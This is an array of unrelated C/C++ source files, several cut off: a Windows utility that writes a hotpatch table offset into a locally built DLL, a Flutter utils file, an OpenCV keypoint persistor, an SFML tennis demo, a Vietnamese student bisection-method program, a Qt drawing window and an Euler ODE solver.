    "#define  _CRT_SECURE_NO_WARNINGS\r\n\r\n#include <Windows.h>\r\n#include <imagehlp.h>\r\n#include <stdio.h>\r\n\r\nstruct _TOOL_INFO {\r\n\tconst char* img_path;\r\n\tconst char* img_map_path;\r\n\tconst char* map_variable_name;\r\n\tuint64_t base_mask;\r\n\t\r\n} g_ToolInfo;\r\nBOOL our_GetImageConfigInformation(\r\n\tPLOADED_IMAGE                LoadedImage,\r\n\tPIMAGE_LOAD_CONFIG_DIRECTORY ImageConfigInformation,\r\n\tsize_t *hotpatch_offset\r\n)\r\n{\r\n\tif (!LoadedImage || !ImageConfigInformation)\r\n\t{\r\n\t\tSetLastError(ERROR_INVALID_PARAMETER);\r\n\t\treturn FALSE;\r\n\t}\r\n\tif (LoadedImage->FileHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC)\r\n\t{\r\n\t\tSetLastError(ERROR_INVALID_PARAMETER);\r\n\t\treturn FALSE;\r\n\t}\r\n\tULONG LoadConfigDirectorySize;\r\n\tPIMAGE_LOAD_CONFIG_DIRECTORY LoadConfigDirectoryAddress\r\n\t\t= (PIMAGE_LOAD_CONFIG_DIRECTORY)ImageDirectoryEntryToDataEx(\r\n\t\t\tLoadedImage->MappedAddress,\r\n\t\t\tFALSE,\r\n\t\t\tIMAGE_DIRECTORY_ENTRY_LOAD_CONFIG,\r\n\t\t\t&LoadConfigDirectorySize,\r\n\t\t\tNULL\r\n\t\t);\r\n\tif (!LoadConfigDirectoryAddress)\r\n\t{\r\n\t\tSetLastError(ERROR_INVALID_DATA);\r\n\t\treturn FALSE;\r\n\t}\r\n\tif (LoadConfigDirectorySize != sizeof(IMAGE_LOAD_CONFIG_DIRECTORY))\r\n\t{\r\n\t\tSetLastError(ERROR_INVALID_DATA);\r\n\t\treturn FALSE;\r\n\t}\r\n\tif (LoadConfigDirectoryAddress->Size > 0 && LoadConfigDirectoryAddress->Size < sizeof(IMAGE_LOAD_CONFIG_DIRECTORY))\r\n\t{\r\n\t\tSetLastError(ERROR_INVALID_DATA);\r\n\t\treturn FALSE;\r\n\t}\r\n\r\n\t*hotpatch_offset = (size_t)&LoadConfigDirectoryAddress->HotPatchTableOffset - (size_t)LoadedImage->MappedAddress;\r\n\tmemcpy(ImageConfigInformation, LoadConfigDirectoryAddress, sizeof(IMAGE_LOAD_CONFIG_DIRECTORY));\r\n\treturn TRUE;\r\n}\r\n\r\n\r\nsize_t read_hotpatch_virtual_address(const char* path) {\r\n\tFILE* fd = fopen(path, \"rb\");\r\n\r\n\tint next_match_index = 0;\r\n\r\n\tint variable_len = strlen(g_ToolInfo.map_variable_name);\r\n\r\n\tbool in_match = false;\r\n\r\n\tchar address_buffer[17] = {0};\r\n\twhile (!feof(fd)) {\r\n\t\t\r\n\t\tchar c = fgetc(fd);\r\n\t\tif (c == g_ToolInfo.map_variable_name[next_match_index]) {\r\n\t\t\tnext_match_index++;\r\n\t\t\tif (next_match_index >= variable_len) {\r\n\t\t\t\tin_match = true;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n\t\telse {\r\n\t\t\tnext_match_index = 0;\r\n\t\t}\r\n\t}\r\n\r\n\t\r\n\tbool got_alnum = 0;\r\n\tchar* addr_buf = (char *) &address_buffer;\r\n\tif (in_match) {\r\n\t\twhile (!feof(fd)) {\r\n\t\t\tchar c = fgetc(fd);\r\n\t\t\tif (got_alnum) {\r\n\t\t\t\tif (isalnum(c)) {\r\n\t\t\t\t\t*addr_buf = c;\r\n\t\t\t\t\taddr_buf++;\r\n\t\t\t\t}\r\n\t\t\t\telse {\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\telse {\r\n\t\t\t\tif (isspace(c)) {\r\n\t\t\t\t\tcontinue;\r\n\t\t\t\t}\r\n\t\t\t\telse {\r\n\t\t\t\t\tgot_alnum = 1;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\r\n\tfclose(fd);\r\n\r\n\tif (in_match) {\r\n\t\tchar* end;\r\n\t\tuint64_t address = strtoll((const char *) &address_buffer, &end, 16);\t\t\r\n\t\treturn (address & g_ToolInfo.base_mask);\r\n\t}\t\r\n\treturn 0;\r\n}\r\nint main() {\r\n\tg_ToolInfo.base_mask = ~0x0000000180000000;\r\n\tg_ToolInfo.img_path = \"C:\\\\NtHotpatch\\\\dist\\\\UpdatedDLL.dll\";\r\n\tg_ToolInfo.img_map_path = \"C:\\\\NtHotpatch\\\\Project1\\\\ARM64\\\\Release\\\\UpdatedDLL.map\";\r\n\tg_ToolInfo.map_variable_name = \"g_HotpatchDefinition\";\r\n\r\n\tPLOADED_IMAGE img;\r\n\r\n\tIMAGE_LOAD_CONFIG_DIRECTORY dic;\r\n\tZeroMemory(&dic, sizeof(dic));\r\n\tdic.Size = sizeof(dic);\r\n\r\n#if 1\r\n\tstatic LOADED_IMAGE ref_img;\r\n\tif (!MapAndLoad(g_ToolInfo.img_path, NULL, &ref_img, TRUE, TRUE)) {\r\n\t\tprintf(\"failed to map and load img - %08x\\n\", GetLastError());\r\n\t\treturn 0;\r\n\t}\r\n\telse {\r\n\t\timg = &ref_img;\r\n\t}\r\n#else\r\n\timg = ImageLoad(g_ToolInfo.img_path, NULL);\r\n\tif (!img) {\r\n\t\tprintf(\"failed to load img - %08x\\n\", GetLastError());\r\n\t\treturn 0;\r\n\t}\r\n#endif\r\n\r\n\tsize_t hotpatch_info_offset = 0;\r\n\tif (!our_GetImageConfigInformation(img, &dic, &hotpatch_info_offset)) {\r\n\t\tprintf(\"Failed to get img config info - %08x\\n\", GetLastError());\r\n\t\tif (!UnMapAndLoad(img)) {\r\n\t\t\tprintf(\"Failed to unmap image\\n\");\r\n\t\t\treturn -1;\r\n\t\t}\r\n\t}\r\n\telse {\r\n\t\tif (dic.HotPatchTableOffset != 0) {\r\n\t\t\tprintf(\"Error: Hotpatch table offset already set: %08x\\n\", dic.HotPatchTableOffset);\r\n\t\t\treturn -1;\r\n\t\t}\r\n\t\tprintf(\"hotpatch_info_offset: %d\\n\", hotpatch_info_offset);\r\n\r\n\t\tsize_t hotpatch_addr = (size_t)read_hotpatch_virtual_address(g_ToolInfo.img_map_path);\r\n\t\tuint32_t hotpatch_truncaddr = (uint32_t)hotpatch_addr;\r\n\t\tprintf(\"hotpatch address: %04x\\n\", hotpatch_addr);\r\n\r\n\t\tif (!UnMapAndLoad(img)) {\r\n\t\t\tprintf(\"Failed to unmap image\\n\");\r\n\t\t\treturn -1;\r\n\t\t}\r\n\r\n\t\tFILE* fd = fopen(g_ToolInfo.img_path, \"rb+\");\r\n\t\tif (!fd) {\r\n\t\t\tprintf(\"failed to open image for writing\\n\");\r\n\t\t\treturn -1;\r\n\t\t}\r\n\r\n\t\tfseek(fd, hotpatch_info_offset, SEEK_SET);\r\n\t\tfwrite(&hotpatch_truncaddr, sizeof(DWORD), 1, fd);\r\n\r\n\r\n\t\tfclose(fd);\r\n\t}\r\n\treturn 0;\r\n}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"VecKeyPointPersistor.h\"\n\n#include <type_traits>\n#include <iostream>\n\n// #include <sys/stat.h>\n// #include <sys/mman.h> \n// #include <fcntl.h>\n#include <stdio.h>\n\nusing namespace std;\nusing namespace cv;\n\nstruct PODKeyPoint {\n    float x;\n    float y;\n    float angle;\n    float size;\n    int octave;\n    float respose;\n};\n\nVecKeyPointPersistor::VecKeyPointPersistor()\n    : /*file(-1),*/ data(nullptr), length(0) {\n}\n\nVecKeyPointPersistor::VecKeyPointPersistor(VecKeyPointPersistor&& o) \n    : file(std::move(o.file)), length(std::move(o.length)), lookup(std::move(o.lookup)), data(std::move(o.data)), keepInMemory(o.keepInMemory) {\n    // o.file = -1;\n    o.data = nullptr;\n}\n\nVecKeyPointPersistor::~VecKeyPointPersistor() {\n    close();\n}\n\nVecKeyPointPersistor& VecKeyPointPersistor::operator = (VecKeyPointPersistor&& o) {\n    file = std::move(o.file); // o.file = -1;\n    lookup = std::move(o.lookup);\n    data = std::move(o.data); o.data = nullptr;\n    length = std::move(o.length); o.length = 0;\n    keepInMemory = o.keepInMemory;\n    return *this;\n}\n\nbool VecKeyPointPersistor::isOpen() {\n    // return file != -1;\n    return file.is_open();\n}\n\nbool VecKeyPointPersistor::exists(const std::string& filename) {\n    FILE *file = fopen(filename.c_str(), \"r\");\n    if (file != nullptr) {\n        fclose(file);\n        return true;\n    }\n    return false;\n}\n\nvoid VecKeyPointPersistor::close() {\n    /*file.release();\n    data.release();*/\n    // if (file != -1) {\n    //     munmap(data, length);\n    //     ::close(file);\n    // }\n    file.close();\n    lookup.clear();\n}\n\nVecKeyPointPersistor VecKeyPointPersistor::open(const std::string& filename, bool keepInMemory) {\n    // int file = ::open(filename.c_str(), O_RDONLY);\n    // if (file < 0) {\n    //     std::cout << \"File does not exist: \" << filename << std::endl;\n    //     exit(-1);\n    //     return VecKeyPointPersistor();\n    // }\n    \n    // struct stat s;\n    // int status = fstat(file, &s);\n    // if (file < 0) {\n    //     std::cout << \"Can not read length of file: \" << filename << std::endl;\n    //     exit(-1);\n    //     return VecKeyPointPersistor();\n    // }\n\n    /*char* data = nullptr;\n    if (keepInMemory) {\n        fseek(file, 0, SEEK_END);\n        size_t fsize = ftell(file);\n        fseek(file, 0, SEEK_SET);\n\n        data = (char*)malloc(fsize + 1);\n        size_t ret = fread(data, 1, fsize, file);\n        assert(ret > 0);\n    }*/\n    keepInMemory = true;\n    boost::iostreams::mapped_file_source file;\n    file.open(filename);\n\n    if (!file.is_open()) {\n        std::cout << \"File does not exist: \" << filename << std::endl;\n        exit(-1);\n        return VecKeyPointPersistor();\n    }\n\n    char* data = (char*)file.data();\n\n    // char* data = (char*)mmap(0, (size_t)s.st_size, PROT_READ, MAP_PRIVATE, file, 0);\n    // if (data == MAP_FAILED) {\n    //     std::cout << \"Can not map file: \" << filename << std::endl;\n    //     exit(-1);\n    //     return VecKeyPointPersistor();\n    // }\n\n    VecKeyPointPersistor pers;\n    pers.file = file;\n    pers.length = file.size(); // s.st_size;\n    pers.data = data;\n    pers.keepInMemory = keepInMemory;\n\n    int ret;\n    size_t descriptorCount = *reinterpret_cast<size_t*>(&data[0]);\n    //fseek(file, 0, SEEK_SET);\n    /*ret = fread(static_cast<void*>(&descriptorCount), 1, sizeof(descriptorCount), pers.file.get());\n    assert(ret == sizeof(descriptorCount));\n    std::vector<DescriptorHeader> descriptors;\n    descriptors.resize(descriptorCount);\n    ret = fread(static_cast<void*>(&descriptors[0]), 1, sizeof(decltype(descriptors)::value_type) * descriptorCount, pers.file.get());\n    assert(ret == sizeof(decltype(descriptors)::value_type) * descriptorCount);*/\n\n    for (size_t i = 0; i < descriptorCount; ++i) {\n        DescriptorHeader descriptor = *reinterpret_cast<DescriptorHeader*>(&data[sizeof(descriptorCount) + i * sizeof(DescriptorHeader)]);\n        pers.lookup[descriptor.frame] = std::make_tuple(descriptor.offset, descriptor.count);\n    }\n\n    return pers;\n}\n\nbool VecKeyPointPersistor::create(const std::string& filename, const std::vector<std::pair<std::vector<cv::KeyPoint>, uint32_t>>& frames) {\n    constexpr size_t KEYPOINT_SIZE = sizeof(((KeyPoint*)0)->pt.x)   +\n                                     sizeof(((KeyPoint*)0)->pt.y)   +\n                                     sizeof(((KeyPoint*)0)->angle)  +\n                                     sizeof(((KeyPoint*)0)->size)   +\n                                     sizeof(((KeyPoint*)0)->octave) +\n                                     sizeof(((KeyPoint*)0)->response);\n    static_assert(sizeof(PODKeyPoint) == KEYPOINT_SIZE, \"The stored keypoint must have the same size as the original one!\");\n\n    FILE* file = fopen(filename.c_str(), \"wb\");\n    if (file == nullptr) {\n        return false;\n    }\n\n    size_t offset = sizeof(DescriptorHeader) * frames.size() + sizeof(size_t);\n    std::vector<DescriptorHeader> descriptors;\n    std::vector<cv::Mat> mats;\n\n    for(size_t i = 0; i ",
    "#include \"cs/core/issues.hpp\"\n#include \"cs/memory/lifecycle.hpp\"\n#include \"cs/memory/malloc.hpp\"\n\n\n// -- public lifecycle --------------------------------------------------------\n\n/* default constructor */\ncs::core::issues::issues(void) noexcept\n: _head{nullptr}, _tail{&_head} {\n}\n\n/* move constructor */\ncs::core::issues::issues(___self&& ___ot) noexcept\n: _head{___ot._head}, _tail{___ot._tail} {\n\t// zero other\n\t___ot._init();\n}\n\n/* destructor */\ncs::core::issues::~issues(void) noexcept {\n\t_clear();\n}\n\n\n// -- public assignment operators ---------------------------------------------\n\n/* move assignment operator */\nauto cs::core::issues::operator=(___self&& ___ot) noexcept -> ___self& {\n\n\t// check self assignment\n\tif (this == &___ot)\n\t\treturn *this;\n\n\t// clear self\n\t_clear();\n\n\t// move members\n\t_copy(___ot);\n\n\t// zero other\n\t___ot._init();\n\n\t// return self\n\treturn *this;\n}\n\n\n// -- public accessors --------------------------------------------------------\n\n/* size */\nauto cs::core::issues::size(void) const noexcept -> size_type {\n\treturn _size;\n}\n\n/* empty */\nauto cs::core::issues::empty(void) const noexcept -> bool {\n\treturn _size == 0U;\n}\n\n\n// -- public modifiers --------------------------------------------------------\n\n/* push */\nauto cs::core::issues::push(cs::core::issue&& ___iss) -> void {\n\n\t// allocate new node\n\tauto* ___new = cs::malloc<___node>();\n\n\t// construct node\n\tcs::lifecycle<___node>::construct(___new, cs::move(___iss));\n\n\t// link node\n\t*_tail = ___new;\n\t_tail = &(___new->_next);\n\n\t// increment size\n\t++_size;\n}\n\n\n// -- private methods ---------------------------------------------------------\n\n/* init */\nauto cs::core::issues::_init(void) noexcept -> void {\n\t_head = nullptr;\n\t_tail = &_head;\n\t_size = 0U;\n}\n\n/* copy */\nauto cs::core::issues::_copy(const ___self& ___ot) noexcept -> void {\n\t_head = ___ot._head;\n\t_tail = ___ot._tail;\n\t_size = ___ot._size;\n}\n\n/* clear */\nauto cs::core::issues::_clear(void) noexcept -> void {\n\n\t___node* it = _head;\n\n\t// loop over issues\n\twhile (it != nullptr) {\n\n\t\t// save next\n\t\tauto* ___nx = it->_next;\n\n\t\t// destruct node\n\t\tcs::lifecycle<___node>::destroy(it);\n\t\t// free node\n\t\tcs::free(it);\n\n\t\t// next\n\t\tit = ___nx;\n\t}\n}\n\n\n// -- public lifecycle --------------------------------------------------------\n\n/* members constructor */\ncs::core::issues::___node::___node(cs::core::issue&& ___iss) noexcept\n: _issue{cs::move(___iss)}, _next{nullptr} {\n}\n",
    "\n////////////////////////////////////////////////////////////\n// Headers\n////////////////////////////////////////////////////////////\n#include <SFML/Graphics.hpp>\n#include <SFML/Audio.hpp>\n#include <cmath>\n#include <ctime>\n#include <cstdlib>\n\n#ifdef SFML_SYSTEM_IOS\n#include <SFML/Main.hpp>\n#endif\n\nstd::string resourcesDir()\n{\n#ifdef SFML_SYSTEM_IOS\n    return \"\";\n#else\n    return \"resources/\";\n#endif\n}\n\n////////////////////////////////////////////////////////////\n/// Entry point of application\n///\n/// \\return Application exit code\n///\n////////////////////////////////////////////////////////////\nint main()\n{\n    std::srand(static_cast<unsigned int>(std::time(NULL)));\n\n    // Define some constants\n    const float pi = 3.14159f;\n    const float gameWidth = 800;\n    const float gameHeight = 600;\n    sf::Vector2f paddleSize(25, 100);\n    float ballRadius = 10.f;\n\n    // Create the window of the application\n    sf::RenderWindow window(sf::VideoMode(static_cast<unsigned int>(gameWidth), static_cast<unsigned int>(gameHeight), 32), \"SFML Tennis\",\n                            sf::Style::Titlebar | sf::Style::Close);\n    window.setVerticalSyncEnabled(true);\n\n    // Load the sounds used in the game\n    sf::SoundBuffer ballSoundBuffer;\n    if (!ballSoundBuffer.loadFromFile(resourcesDir() + \"ball.wav\"))\n        return EXIT_FAILURE;\n    sf::Sound ballSound(ballSoundBuffer);\n\n    // Create the SFML logo texture:\n    sf::Texture sfmlLogoTexture;\n    if(!sfmlLogoTexture.loadFromFile(resourcesDir() + \"sfml_logo.png\"))\n        return EXIT_FAILURE;\n    sf::Sprite sfmlLogo;\n    sfmlLogo.setTexture(sfmlLogoTexture);\n    sfmlLogo.setPosition(170, 50);\n\n    // Create the left paddle\n    sf::RectangleShape leftPaddle;\n    leftPaddle.setSize(paddleSize - sf::Vector2f(3, 3));\n    leftPaddle.setOutlineThickness(3);\n    leftPaddle.setOutlineColor(sf::Color::Black);\n    leftPaddle.setFillColor(sf::Color(100, 100, 200));\n    leftPaddle.setOrigin(paddleSize / 2.f);\n\n    // Create the right paddle\n    sf::RectangleShape rightPaddle;\n    rightPaddle.setSize(paddleSize - sf::Vector2f(3, 3));\n    rightPaddle.setOutlineThickness(3);\n    rightPaddle.setOutlineColor(sf::Color::Black);\n    rightPaddle.setFillColor(sf::Color(200, 100, 100));\n    rightPaddle.setOrigin(paddleSize / 2.f);\n\n    // Create the ball\n    sf::CircleShape ball;\n    ball.setRadius(ballRadius - 3);\n    ball.setOutlineThickness(2);\n    ball.setOutlineColor(sf::Color::Black);\n    ball.setFillColor(sf::Color::White);\n    ball.setOrigin(ballRadius / 2, ballRadius / 2);\n\n    // Load the text font\n    sf::Font font;\n    if (!font.loadFromFile(resourcesDir() + \"tuffy.ttf\"))\n        return EXIT_FAILURE;\n\n    // Initialize the pause message\n    sf::Text pauseMessage;\n    pauseMessage.setFont(font);\n    pauseMessage.setCharacterSize(40);\n    pauseMessage.setPosition(170.f, 200.f);\n    pauseMessage.setFillColor(sf::Color::White);\n\n    #ifdef SFML_SYSTEM_IOS\n    pauseMessage.setString(\"Welcome to SFML Tennis!\\nTouch the screen to start the game.\");\n    #else\n    pauseMessage.setString(\"Welcome to SFML Tennis!\\n\\nPress space to start the game.\");\n    #endif\n\n    // Define the paddles properties\n    sf::Clock AITimer;\n    const sf::Time AITime   = sf::seconds(0.1f);\n    const float paddleSpeed = 400.f;\n    float rightPaddleSpeed  = 0.f;\n    const float ballSpeed   = 400.f;\n    float ballAngle         = 0.f; // to be changed later\n\n    sf::Clock clock;\n    bool isPlaying = false;\n    while (window.isOpen())\n    {\n        // Handle events\n        sf::Event event;\n        while (window.pollEvent(event))\n        {\n            // Window closed or escape key pressed: exit\n            if ((event.type == sf::Event::Closed) ||\n               ((event.type == sf::Event::KeyPressed) && (event.key.code == sf::Keyboard::Escape)))\n            {\n                window.close();\n                break;\n            }\n\n            // Space key pressed: play\n            if (((event.type == sf::Event::KeyPressed) && (event.key.code == sf::Keyboard::Space)) ||\n                (event.type == sf::Event::TouchBegan))\n            {\n                if (!isPlaying)\n                {\n                    // (re)start the game\n                    isPlaying = true;\n                    clock.restart();\n\n                    // Reset the position of the paddles and ball\n                    leftPaddle.setPosition(10.f + paddleSize.x / 2.f, gameHeight / 2.f);\n                    rightPaddle.setPosition(gameWidth - 10.f - paddleSize.x / 2.f, gameHeight / 2.f);\n                    ball.setPosition(gameWidth / 2.f, gameHeight / 2.f);\n\n                    // Reset the ball angle\n                    do\n                    {\n                        // Make sure the ball initial angle is not too much vertical\n                        ballAngle = static_cast<float>(std::rand() % 360) * 2.f * pi / 360.f;\n                    }\n                    while (std::abs(std::cos(ballAngle)) < 0.7f);\n                }\n            }\n\n            // W",
    "#include <stdio.h>\n#include <string.h>\n#include <math.h>\n#include <windows.h>\n#define eps 1e-3\n\nvoid read_file(char filename[], int &n, float A[][100], int &check);\nvoid input_file(char a[], float A[][100], int &n);\nvoid change(float A[][100], float B[], int n);\nvoid print_POLYNOMIAL(float B[], int n);\nfloat Fx(float B[], int n, float x0);\nvoid enter_input(float &a, float &b, float B[], int n);\nfloat solve(float B[], float a, float b, int n);\nvoid information();\nvoid result(char a[]);\nint menu_input(int &com);\nvoid mtA(float A[][100], int &n);\nvoid setcolor(int backgound_color, int text_color);\n\nint main()\n{\n    int n,com;\n    float a, b,c;\n    char name[100], re[100], other[1],newP[1];\n    float A[100][100];\n    float B[100];\n\n    information();//Introduce the topic and related information\n   \n    do{\n       menu_input(com);\n       if(com==1){\n        setcolor(0,3);\n        printf(\"\\tMoi ban nhap ma tran A\\n\");\n        printf(\"\\tNhap buc cua ma tran: \");\n        setcolor(0,8);\n        scanf(\"%d\", &n);\n        mtA(A, n);\n       }\n       else if(com==2){\n        (getchar()) != '\\n';         \n        input_file(name,A,n);\n       }\n       \n        setcolor(0,15);\n        change(A,B,n);\n        print_POLYNOMIAL(B,n);\n         while (1){\n            enter_input(a,b,B,n);\n            c=solve(B,a,b,n);\n            setcolor(0,15);\n            printf(\"\\n    Bang gia tri thuc hien phuong phap chia doi\\n\");\n            setcolor(0,3);\n            printf(\"\\nNgiem cua phuong trinh la:  %.3f\", c);\n            printf(\"\\n\\nBan co muon nhap khoang nghiem khac khong (y/n)? \");\n            setcolor(0,8);\n            scanf(\"%s\",other);\n            if (other[0]!='y') break;\n        }\n        setcolor(0,3);\n        printf(\"\\n\\nBan co muon tim nghiem voi da thuc khac khong(Neu muon nhap lai thi chon c, con khong muon thi nhap phim bat ki)? \");\n        setcolor(0,8);\n        scanf(\"%s\", newP);\n    }while(newP[0]=='c');\n    }\n\nvoid setcolor(int backgound_color, int text_color)\n{\n    HANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE);\n    int color_code = backgound_color * 16 + text_color;\n    SetConsoleTextAttribute(hStdout, color_code);\n}\n\nvoid information()\n{\n    int i;\n    setcolor(0, 3);\n    printf(\"\\n%9c\", 201);\n    for (i = 0; i <= 85; i++)\n        printf(\"%c\", 205);\n    printf(\"%c\", 187);\n    printf(\"\\n        %c %86c\", 4, 4);\n    printf(\"\\n        %c                             DO AN LAP TRINH TINH TOAN                                %c\", 4, 4);\n    printf(\"\\n        %c                   DE TAI: Tim nghiem gan dung bang phuong phap chia doi              %c\", 4, 4);\n    printf(\"\\n        %c %86c\", 4, 4);\n    printf(\"\\n        %c       Sinh vien thuc hien:                       Giao vien huong dan:                %c\", 4, 4);\n    printf(\"\\n        %c           %c Le Ngoc Lam Na                            %c Do Thi Tuyet Hoa             %c\", 4, 45, 45, 4);\n    printf(\"\\n        %c           %c Le Xuan Tung Son  %56c\", 4, 45, 4);\n    printf(\"\\n        %c %86c\", 4, 4);\n    printf(\"\\n        %c\", 200);\n    for (i = 0; i <= 85; i++)\n        printf(\"%c\", 205);\n    printf(\"%c\\n\", 188);\n}\n\nvoid read_file(char filename[], int &n, float A[][100], int &check)\n{   setcolor(0,3);\n    FILE *file = fopen(filename, \"r\");\n    if (file == NULL)\n    {\n        check = 0;        \n        return;\n    }\n    fscanf(file, \"%d\", &n); // read array size\n    char a;\n    int s = 0, count = 0;\n\n    // check size file\n    for (int i = 0; i < n; i++)\n    {\n        for (int j = 0; j < n; j++)\n        {\n            if (fscanf(file, \"%f\", &A[i][j]) == 1)\n            { // save data into array A\n                s++;\n                if ((a = fgetc(file)) != '\\n')\n                {\n                    if (a != EOF)\n                        count++;\n                }\n                else\n                {\n                    break;\n                }\n            }\n        }\n        if (count != (n - 1))\n        {\n            check = 2;\n            fclose(file);\n            return;\n        }\n        count = 0;\n    }\n    if (s != n * n)\n    {\n        check = 2;\n        fclose(file);\n        return;\n    }\n    check = 1;\n    fclose;\n}\n\nvoid input_file(char a[], float A[][100], int &n)\n{   \n    setcolor(0,3);\n    int check;\n    do\n    {\n        printf(\"Nhap ten file du lieu: \");\n         setcolor(0, 8);\n        fgets(a, 100, stdin); // input name file to array a\n        a[strcspn(a, \"\\n\")] = 0;\n        setcolor(0,3);\n        read_file(a, n, A, check);\n        if (check == 0)\n        {\n            printf(\"File %s khong ton tai\\n\", a);\n        }\n        else if (check == 2)\n        {\n            printf(\"File %s bi loi \\n\", a);\n        }\n        else\n        {\n            printf(\"Doc file thanh cong\\n\");\n        }\n    } while (check == 0 || check == 2);\n}\n\nvoid change(float A[][100], float B[], int n)\n{ // data analysis\n    B[0] = 0;\n    for (int i = 0; i < n; i++)\n    {\n        for (int j = 0; j < n; j++)\n        {\n            B[i] += A[j][i];\n        }\n    }\n    float max = B[",
    "#include \"SendWindow.h\"\r\n#include <QPainter>\r\n#include <QDebug>\r\n#include <QColorDialog>\r\n\r\nSendWindow::SendWindow(QWidget *parent) : QMainWindow(parent), drawing(false) {\r\n    setWindowTitle(\"Send Window\");\r\n    image = QImage(size(), QImage::Format_ARGB32_Premultiplied);\r\n    image.fill(Qt::white);\r\n    //paintColor = Qt::black;\r\n\r\n    clearButton = new QPushButton(\"Clear\", this);\r\n    clearButton->move(10, 10);\r\n    connect(clearButton, &QPushButton::clicked, this, &SendWindow::clearDrawing);\r\n}\r\n\r\nvoid SendWindow::drawLine(const QPoint& startPos, const QPoint& endPos, const QColor& color) {\r\n    QPainter painter(&image);\r\n    painter.setPen(QPen(color, 2));\r\n    painter.drawLine(startPos, endPos);\r\n    update();\r\n}\r\n\r\nvoid SendWindow::serializeImage(){\r\n    QByteArray imageData;\r\n    QDataStream stream(&imageData, QIODevice::WriteOnly);\r\n    stream << this->image;\r\n    emit imageSent(imageData);\r\n}\r\n\r\nvoid SendWindow::mousePressEvent(QMouseEvent *event) {\r\n    if (event->button() == Qt::LeftButton) { //left click to draw\r\n        drawing = true;\r\n        lastPos = event->pos();\r\n        startPos = lastPos; // Update the start position of the line\r\n    }\r\n}\r\n\r\nvoid SendWindow::mouseMoveEvent(QMouseEvent *event) {\r\n    if ((event->buttons() & Qt::LeftButton) && drawing) {\r\n        //draw the last position of the line as the mouse moving\r\n        drawLine(lastPos, event->pos(), Qt::blue);\r\n        lastPos = event->pos();\r\n        //data serialization\r\n        serializeImage();\r\n    }\r\n}\r\n\r\nvoid SendWindow::mouseReleaseEvent(QMouseEvent *event) {\r\n    if (event->button() == Qt::LeftButton && drawing) { //release left click to stop drawing\r\n        drawing = false;\r\n    }\r\n}\r\n\r\nvoid SendWindow::paintEvent(QPaintEvent *event) {\r\n    QMainWindow::paintEvent(event);\r\n    QPainter painter(this);\r\n    painter.drawImage(0, 0, image);\r\n}\r\n\r\nvoid SendWindow::clearDrawing() {\r\n    image.fill(Qt::white);\r\n    update();\r\n    emit clearSignal(); // Emit the clearSignal when drawing is cleared\r\n}\r\n",
    "#include <iostream>\n#include <vector>\n#include <cmath>\n#include <iomanip>\n\nstd::vector<double> operator*(double scalar, const std::vector<double> &v) {\n    std::vector<double> result(v.size());\n    for (int i = 0; i < v.size(); i++) {\n        result[i] = v[i] * scalar;\n    }\n    return result;\n}\n\nstd::vector<double> operator+(const std::vector<double> &v1, const std::vector<double> &v2) {\n    std::vector<double> result(v1.size());\n    for (int i = 0; i < v1.size(); i++) {\n        result[i] = v1[i] + v2[i];\n    }\n    return result;\n}\n\nstd::vector<double> F(double x, const std::vector<double> &y) {\n    std::vector<double> f(2);\n    f[0] = std::cos(-1 + x + y[0] + 3 * y[1]);\n    f[1] = -y[0] * y[0] + 2 * std::sin(y[1]);\n    return f;\n}\n\nvoid Euler(double n, std::vector<double> (*func)(double, const std::vector<double> &), std::vector<double> &a, double x0, double xEnd, double accuracy, int eq) {\n    std::vector<std::vector<double>> container;\n    std::cout << std::setw(2)  << \"i\"; \n    std::cout << std::setw(15) << \"A(h_i)\";\n    std::cout << std::setw(20) << \"A(h_(i-1))-A(h_i)\"; \n    std::cout << std::setw(15) << \"alpha_k\";\n    std::cout << std::setw(15) << \"rich-error\"; \n    std::cout << std::setw(15) << \"order\";\n    std::cout << std::setw(10) << \"n\";\n    std::cout << std::endl;\n\n    double prev_prev_integral = 0.0;\n    double prev_integral = 0.0;\n    for (int i = 0; i < 50; i++) {\n        std::vector<double> yn = a;\n        double h = (xEnd - x0) / n;\n        for (int j = 0; j < n; j++) {\n            yn = yn + h * func(x0 + j * h, yn);\n        }\n        \n        container.push_back(yn);\n\n        double integral = container[i][eq];\n        std::cout << std::setw(2) << i << std::setw(15) << integral;\n        \n        if (i > 0) {\n            double diff = prev_integral - integral;\n            std::cout << std::setw(20) << diff;\n            if (i > 1) {\n                double diff1 = prev_prev_integral - prev_integral; \n                double alpha_k = diff1 / diff;           \n                double richardson = (diff) / (alpha_k - 